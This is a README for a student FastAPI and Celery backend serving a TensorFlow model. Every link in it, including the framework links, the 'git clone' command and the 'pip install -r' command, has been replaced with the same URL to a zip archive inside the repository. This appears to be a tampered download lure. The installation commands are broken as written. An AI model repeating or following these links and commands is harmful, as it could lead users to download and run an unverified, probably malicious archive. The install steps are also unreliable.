# fyp-webapp-server

Final Year Project's backend using Python FastAPI framework and Celery to serve Tensorflow Model

### Built With

-   [FastAPI](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)
-   [Celery](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)
-   [Redis](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)

### Prerequisites

-   Python 3.7.11, install specific Python version using [pyenv](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)
    ```sh
    pyenv install -v 3.7.11
    pyenv global 3.7.11
    ```
-   Redis installed on your machine

### Installation

1. Clone the repo
    ```sh
    git clone https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip
    ```
2. Create and startup Python virtual environment
    ```sh
    pip3 install virtualenv
    virtualenv .venv
    source .venv/bin/activate
    ```
3. Install Python packages
    ```sh
    pip install -r https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip
    ```

### Run apps locally using [Heroku CLI](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)

1. Set up local environment variables
    ```sh
    touch .env
    open .env
    ```
    Here’s an example .env file:
    ```
    REDIS_TLS_URL=rediss://
    REDIS_URL=redis://
    ```
2. Start up Redis server

    ```sh
    redis-server
    ```

3. Locally start all of the process types that are defined in Procfile
    ```sh
    heroku local
    ```

### Test and document your API using OpenAPI Swagger

-   Open your browser and navigate: http://localhost:5000/docs
